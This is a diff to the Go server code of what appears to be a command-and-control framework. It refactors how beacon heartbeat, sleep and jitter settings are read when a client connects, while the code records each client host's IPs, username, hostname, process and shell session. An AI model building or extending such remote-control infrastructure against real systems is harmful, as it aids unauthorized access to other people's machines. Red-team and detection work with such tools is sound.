@@ -529,10 +529,11 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 				arch = "x64"
 			}
 
-			// 从监听器配置中获取心跳参数
-			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
+			// 从监听器配置中获取心跳/beacon 参数
+			beaconCfg := database.GetListenerBeaconConfigByAddr(conn.LocalAddr().String(), listenerType)
+			heartbeatTimeout, heartbeatInterval := beaconCfg.HeartbeatTimeout, beaconCfg.HeartbeatInterval
 
-			database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
+			database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveListenerSleep(osArray, beaconCfg)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
 			database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
 			database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
@@ -569,11 +570,11 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 		// 统一离线检测器注册（心跳间隔取监听器配置——客户端二进制 patch 的同一值；
 		// 原用 client.Sleep(命令休眠,firstBlood 恒为 "1")→ 心跳间隔 ≥30s 的客户端会被误判离线）
 		if connection.GlobalOfflineDetector != nil {
-			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
+			beaconCfg := database.GetListenerBeaconConfigByAddr(conn.LocalAddr().String(), listenerType)
 			// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
 			clientMeta := strings.Split(string(metainfo[9:]), "\t")
-			sleepSec := connection.ResolveSleepSeconds(clientMeta, hbInterval)
-			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
+			sleepSec := connection.ResolveListenerSleep(clientMeta, beaconCfg)
+			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, beaconCfg.JitterPercent, func() {
 				Mutex.Lock()
 				delete(TCPClientManger, uid)
 				delete(ClientTimeManager, uid)
@@ -600,20 +601,12 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 		}
 		uid := encrypt.BytesToMD5(metainfo)
 
-		// 【性能优化】密钥状态检查移出全局锁：GetKeyStatus/ParseDuration 为慢操作，
-		// 原实现每条心跳持全局 Mutex 执行，串行化全部客户端心跳
+		// 【性能优化】只读密钥到期时间：原实现每条心跳调 GetKeyStatus（分配多个 map、
+		// 格式化 Duration 字符串）再用 strings.Contains + ParseDuration 解析回来。
 		var keyExpiringSoon time.Duration
 		if encrypt.GlobalKeyManager != nil {
-			keyStatus := encrypt.GlobalKeyManager.GetKeyStatus(uid)
-			if keyStatusData, ok := keyStatus["current_key"].(map[string]interface{}); ok {
-				if timeToExpiry, ok := keyStatusData["time_to_expiry"].(string); ok {
-					if strings.Contains(timeToExpiry, "h") {
-						// 如果密钥在 4 小时内过期，发送密钥更新通知
-						if duration, err := time.ParseDuration(timeToExpiry); err == nil && duration <= 4*time.Hour && duration > 0 {
-							keyExpiringSoon = duration
-						}
-					}
-				}
+			if ttl, ok := encrypt.GlobalKeyManager.TimeToExpiry(uid); ok && ttl > 0 && ttl <= 4*time.Hour {
+				keyExpiringSoon = ttl
 			}
 		}
 
